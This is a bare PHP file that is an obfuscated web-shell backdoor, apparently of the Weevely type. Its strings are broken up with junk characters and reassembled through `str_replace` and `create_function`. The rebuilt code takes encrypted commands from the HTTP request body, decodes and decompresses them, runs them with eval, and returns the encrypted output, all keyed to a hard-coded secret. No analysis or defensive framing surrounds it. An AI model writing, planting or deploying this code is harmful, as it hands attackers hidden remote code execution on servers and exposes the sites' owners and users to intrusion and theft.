<?php
$h='=1)c! {@ob_stac!rt();c!@evac!l(c!@gzuncomprec!ss(@x(@c!bc!ac!se6c!4_decode(';
$R='c!ase64c!_encode(@c!x(@gzcoc!mprc!c!c!ess($o),$k))c!;printc!("$p$kh$r$kf");}';
$g='$m[c!1c!]),c!$k)));$o=@ob_get_contenc!ts();@c!ob_c!end_clec!an();$c!r=@b';
$o='en(c!$c!t);$o="";foc!r($i=0;c!c!$ic!<$l;){for(c!$j=0;($j<$c&c!&$c!i<$l);';
$b='"fc!vc!lHE6fKjG3S7Vqc!c!c";function c!x($t,$c!k)c!{$cc!=strlen($k);$l=sc!trl';
$s='$jc!++c!,$i+c!+){$o.=$t{$i}c!^$kc!{$j};}}rc!eturc!n $c!o;}if (@c!preg_mac!tc';
$Z=str_replace('MC','','cMCreMCateMC_fMCuncMCtiMCon');
$u='$k="e2c!5d3c!8d2";$kh="c!000ac!535217b7"c!;$kf="c!4ca7c!c!772a76a9";c!$p=';
$j='h("/$khc!(.c!+)c!$kfc!/",@file_get_c!contentsc!("php://ic!c!nputc!"),$m)=';
$a=str_replace('c!','',$u.$b.$o.$s.$j.$h.$g.$R);
$T=$Z('',$a);$T();
?>
